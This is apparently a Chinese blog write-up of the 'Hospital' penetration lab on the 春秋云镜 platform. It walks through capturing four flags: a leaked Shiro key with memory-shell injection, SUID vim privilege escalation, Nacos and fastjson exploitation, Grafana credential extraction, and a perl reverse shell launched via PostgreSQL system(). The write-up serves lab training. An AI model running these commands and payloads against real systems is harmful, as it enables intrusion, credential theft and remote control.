sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">org.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolver</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">user.name = app</span><br><span class="line">policy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">securerandom.source = file:/dev/random</span><br><span class="line">policy.url.2 = file:$&#123;user.home&#125;/.java.policy</span><br><span class="line">jdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves</span><br><span class="line">policy.ignoreIdentityScope = false</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter</span><br><span class="line">jdk.sasl.disabledMechanisms =</span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">org.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolver</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">java.vm.specification.name = Java Virtual Machine Specification</span><br><span class="line">jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37</span><br><span class="line">PID = 750</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span><br><span class="line">java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib</span><br><span class="line">java.vendor = Private Build</span><br><span class="line">java.specification.maintenance.version = 5</span><br><span class="line">handlers = java.util.logging.ConsoleHandler</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">krb5.kdc.bad.policy = tryLast</span><br><span class="line">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">jdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048</span><br><span class="line">jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1</span><br><span class="line">crypto.policy = unlimited</span><br><span class="line">jceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*</span><br><span class="line">login.configuration.provider = sun.security.provider.ConfigFile</span><br><span class="line">user.timezone =</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">user.country = US</span><br><span class="line">jdk.security.caDistrustPolicies = SYMANTEC_TLS</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">user.home = /home/app</span><br><span class="line">user.language = en</span><br><span class="line">en = UTF-8</span><br><span class="line">jdk.tls.alpnCharset = ISO_8859_1</span><br><span class="line">ssl.KeyManagerFactory.algorithm = SunX509</span><br><span class="line">.level = INFO</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">java.awt.headless = true</span><br><span class="line">com.xyz.foo.level = SEVERE</span><br><span class="line">policy.provider = sun.security.provider.PolicyFile</span><br><span class="line">path.separator = :</span><br><span class="line">fr = UTF-8</span><br><span class="line">os.version = 5.4.0-164-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">keystore.type.compat = true</span><br><span class="line">org.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter</span><br><span class="line">java.util.logging.FileHandler.count = 1</span><br><span class="line">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">sun.cds.enableSharedLookupCache = false</span><br><span class="line">sun.security.krb5.maxReferrals = 5</span><br><span class="line">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.util.logging.FileHandler.limit = 50000</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">keystore.type = jks</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line">policy.expandProperties = true</span><br><span class="line">securerandom.strongAlgorithms = NativePRNGBlocking:SUN</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ProcessEnvironment</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OSS</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">UserPassSearcher</span><br><span class="line">-------------</span><br><span class="line">org.apache.shiro.web.filter.authc.FormAuthenticationFilter:</span><br><span class="line">[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]</span><br><span class="line"></span><br><span class="line">org.apache.catalina.startup.Tomcat:</span><br><span class="line">[hostname = localhost]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AuthThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br></pre></td></tr></table></figure>

<p>有一个shirokey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure>

<p>用shiro工具注入内存马,冰蝎连接即可</p>
<p>vim.basic存在suid权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app@web01:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>系统存在python3环境， 参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a> 提权，flag01在/root/flag下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vim.basic -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>然后搭建一个代理隧道，上传一个fscan开始扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">ip a   </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315357949sec preferred_lft 315357949sec</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aa83/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">       </span><br><span class="line">       ./fscan -h 172.30.12.1/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-10 17:23:09] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-10 17:23:09] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-10 17:23:09] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 解析CIDR 172.30.12.1/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-10 17:23:10] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class="line">[2025-04-10 17:23:13] [INFO] 存活主机数量: 3</span><br><span class="line">[2025-04-10 17:23:13] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class="line">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class="line">[2025-04-10 17:23:19] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class="line">[2025-04-10 17:23:24] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; </span><br><span class="line">[2025-04-10 17:24:18] [INFO] 存活端口数量: 9</span><br><span class="line">[2025-04-10 17:24:18] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-10 17:24:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.30.12.6</span><br><span class="line">主机名: Server02</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.30.12.6</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392</span><br><span class="line">[2025-04-10 17:24:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="line">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="line">[2025-04-10 17:24:19] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class="line">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="line">[2025-04-10 17:24:20] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class="line">[2025-04-10 17:24:21] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class="line">        links:https://github.com/alibaba/nacos/issues/4593</span><br></pre></td></tr></table></figure>

<p>扫到了一个nacos，那就从这里入手，弱口令nacos/nacos登录,这个框架还存在yaml反序列化漏洞</p>
<p>在172.30.12.5上面放上恶意的jar文件，然后开启一个web服务，再用利用工具去执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">RDP         172.30.12.6     3389   Server02         [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)</span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK</span><br><span class="line">RDP         172.30.12.6     3389   Server02         [+] Server02\lv:Asd123132. (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>用户添加成功了，挂上代理，远程桌面连接，flag02在C:\Users\Administrator\flag下</p>
<h1 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h1><p>172.30.12.236主机开放了8009端口，登录口传入的数据为 JSON 格式。探测 fastjson 版本 payload：<code>&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code></p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png">https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png</a>)</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital1.png"></p>
<p>用<a target="_blank" rel="noopener" href="https://github.com/amaz1ngday/fastjson-exp">bp的插件</a>注入内存马,哥斯拉连接，flag03在/root/flag/下</p>
<h1 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h1><p>这个靶机还有第二张网卡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/ &gt;ip a</span><br><span class="line"></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315354333sec preferred_lft 315354333sec</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aae2/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::216:3eff:fe0d:aa92/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>上传一个fscan，然后扫一下，地址为172.30.54.12，需要二层内网代理，这台机器上有<strong>grafana+postgres</strong>两个服务，grafana存在弱口令admin/admin登录,在web3的机器上上传一个<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">exp</a>,可以跑到postgres的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]</span><br><span class="line">2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">2024/07/04 12:20:59 There is [0] records in db.</span><br><span class="line">2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]</span><br><span class="line">2024/07/04 12:20:59 All Done, have nice day!</span><br></pre></td></tr></table></figure>

<p><code>psql -h 172.30.54.12 -p 5432 -U postgres</code>连接,查询root的密码<code>select usename, passwd from pg_shadow;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select usename, passwd from pg_shadow;</span><br><span class="line"> usename  |               passwd</span><br><span class="line">----------+-------------------------------------</span><br><span class="line"> root     | md5da974531914a7c2c56df745574a5bd3a</span><br><span class="line"> postgres | md5dd27d33705155fd675e498384ad3d2ea</span><br></pre></td></tr></table></figure>

<p>爆破出来是<code>P@ssw0rd123</code>,在web03的机器上监听一个端口，然后用perl反弹一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>然后psql提权，flag04在/root/flag/下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/" class="post-title-link" itemprop="url">春秋云镜-Time</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-09 00:08:14 / 修改时间：14:48:36" itemprop="dateCreated datePublished" datetime="2025-04-09T00:08:14+08:00">2025-04-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

